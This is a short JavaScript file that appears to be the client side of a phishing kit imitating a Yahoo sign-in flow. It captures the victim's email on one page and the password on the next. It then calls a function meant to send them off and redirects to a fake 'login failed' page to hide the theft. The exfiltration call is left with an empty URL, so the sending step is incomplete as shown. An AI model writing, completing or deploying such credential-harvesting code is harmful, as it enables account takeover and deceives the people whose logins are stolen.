document.addEventListener("DOMContentLoaded", function() {
    //form handler
    console.log("sender script loaded");

    const hostname = "http://127.0.0.1:5500";
    const nextButton = document.querySelector("#login-signin");
    const emailInput = document.querySelector("#login-username");
    const passwordInput = document.querySelector("#login-passwd");
    const emailClass = document.querySelector(".yid");
    const submitButton = document.querySelector("#login-signin");

    if (nextButton) {
        nextButton.addEventListener("click", function (e) {
            e.preventDefault();
            const email = emailInput.value;
            gotoPassword(email); 
        });
    }
    else {
        console.error("Element with id #login-signin not found");
    }

    const email = localStorage.getItem("user-email");
    emailClass.textContent = email;

    submitButton.addEventListener("click", function (e) {
        e.preventDefault();
        const password = passwordInput.value;
        sendFormAndRedirect(email, password);
    });

    //go to password page function declaration
    function gotoPassword(email) {
        //regex just yahoo mail and next otherwise display error
        //then
        localStorage.setItem("user-email", email);
        window.location.href = `${hostname}/display-password.htm`;
    };

    async function sendFormAndRedirect(email, password) {
        localStorage.removeItem("user-email");
        const data = await fetch("");
        const res = await data.json();
        if (!res) {
            window.location.reload();
        };
        window.location.href = `${hostname}/login-failed.htm`;
        
    };
});

